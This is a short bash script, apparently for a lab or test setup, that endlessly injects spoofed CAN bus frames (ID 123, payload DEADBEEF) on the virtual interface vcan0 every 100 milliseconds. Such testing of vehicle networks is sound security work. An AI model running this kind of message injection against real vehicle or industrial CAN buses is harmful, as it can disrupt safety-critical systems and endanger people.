#!/bin/bash

# Infinite loop to continuously send spoofed CAN messages
while true; do
    # Send a spoofed message with CAN ID 123 and data "DEADBEEF"
    cansend vcan0 123#DEADBEEF
    sleep 0.1  # Send a message every 100ms
done
